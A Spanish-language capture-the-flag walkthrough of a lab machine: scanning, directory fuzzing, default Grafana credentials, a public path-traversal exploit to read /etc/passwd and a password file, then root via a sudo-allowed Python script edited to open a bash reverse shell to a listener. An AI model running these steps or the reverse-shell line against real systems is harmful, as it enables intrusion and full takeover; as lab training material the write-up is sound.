## Reconocimiento:

Puerto 21 : FTP

Puerto 22 : SSH

Puerto 80 : HTTP

Puerto 3000 : ppp?

Muy extraño pero el servicio ftp no tiene nada útil, el puerto 80 es una web Apache normal así que le aplico fuzzing:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt -t 100 -k -r
```

Encuentro /maintenance.html que revela /tmp/pass.txt.

Interesa el puerto 3000 donde hay un login de Grafana, que adivino credenciales: 

```bash
admin:admin
```

Utilizo la herramienta searchsploit para ver si tiene algún exploit disponible:

```bash
searchsploit grafana
```

Encuentro uno y lo ejecuto:

```bash
python3 50581.py -H http://172.17.0.2:3000 
```

Tiene una opción de “Read file”. Primero listo los usuarios del sistema:

```bash
Read file > /etc/passwd
```

Encuentro el usuario freddy.

Investigo el archivo que vi antes:

```bash
Read file > /tmp/pass.txt
# info
t9sH76gpQ82UFeZ3GXZS
```

Pruebo en SSH y es la contraseña del usuario freddy.

## Escalada

```bash
sudo -l
(ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

Veo que el archivo tiene todos los permisos para el usuario freddy, así que lo edito para mandarme una shell con privilegios root:

```bash
import subprocess
comando = "/bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'"
subprocess.run(comando, shell=True)
```

Me pongo en escucha desde mi máquina host:

```bash
nc -lnvp 4444
```

Y dentro del servidor lo ejecuto con sudo:

```bash
sudo python3 /opt/maintenance.py
```

Listo.
